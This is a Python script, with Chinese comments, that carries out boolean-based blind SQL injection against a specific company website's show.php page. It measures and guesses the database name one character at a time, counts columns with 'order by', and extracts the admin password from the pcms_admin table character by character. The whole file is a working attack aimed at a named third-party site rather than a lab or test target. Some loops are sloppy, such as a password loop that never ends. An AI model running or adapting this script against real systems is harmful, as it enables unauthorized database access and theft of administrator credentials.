import requests
import multiprocessing
import os


url="http://www.hfgx.com/show.php?id=3&pid=5&newsid=4286"
payload = ("1234567890qwertyuiop,asdfghjklzxcvbnm_")
taname=("admin","testadmin","testuser","user","liuyan")
cloumn=("username","password","id","email","comment","ip","content")
database = ""
newtablename=[]
def burp_data():

    leng=0
    tmp=""
    while True:
        lengdata = " and length(database())>" + str(leng)

        r=requests.get(url+lengdata)
        #r.encoding="gbk"
        re=r.text
        # print(re)
        if "高新股份开展年轻干部专题培训" not in re:
            break
        else:
            leng+=1

    print(f'当前数据库名的长度为{leng}',os.getpid())
    tint=1


    print("正在破解数据库名请稍等：",end="")
    tamp=""
    for i in range(1,leng):


        for ii in payload:
                test = " and left(database(),%s)='%s" % (tint,tamp+ii) + "'"

                r=requests.get(url+test)
                r.encoding="gbk"
                re=r.text
                print(".",end="")
                if "高新股份开展年轻干部专题培训" not in re:
                    continue
                else:
                    tamp += ii
                    break



        tint+=1
    database=tamp
        # tmp += ii
    print()
    print("数据库破解成功："+database)


def burp_tables():
    # burp_data()

    tmp=[]
    #确定字段数
    num = 1
    while True:
        # tables=" and (select length(group_concat(table_name)) from information_schema.tables where table_schema='hackyl' limit 0,1 )> "+str(i)
        tablespoc=" order by "+str(num)
        r=requests.get(url+tablespoc)
        r.encoding="gbk"
        if "用户名" in r.text:
            num += 1
        else:
            num-=1
            break
    print(f'字段数为{num}',os.getpid())
    #猜表名
    s1=[]
    for newnum in range(num):
        s1.append(str(newnum+1))

    news1=','.join(s1)

    # print(news1)
    num=1
    print("表名：", end='')
    while 1:

        for i in  range(1,127):
            tablename=" and ascii(substr((select password from pcms_admin limit 0,1),%s,1))= "%num+str(i)
            r=requests.get(url+tablename)
            r.encoding="gbk"
            # print(url+tablename)
            if "高新股份开展年轻干部专题培训" not in r.text:
                continue
            else:

                print(chr(i),end='')
                num += 1

    newtablename=tmp
    t=','.join(newtablename)
    print(f'数据库中存在的表：{t}')

if __name__ == '__main__':
    print(os.getpid())
    task1=multiprocessing.Process(target=burp_data,name="破解数据库")
    task1.start()
    #task2=multiprocessing.Process(target=burp_tables,name="破解表")
    #task2.start()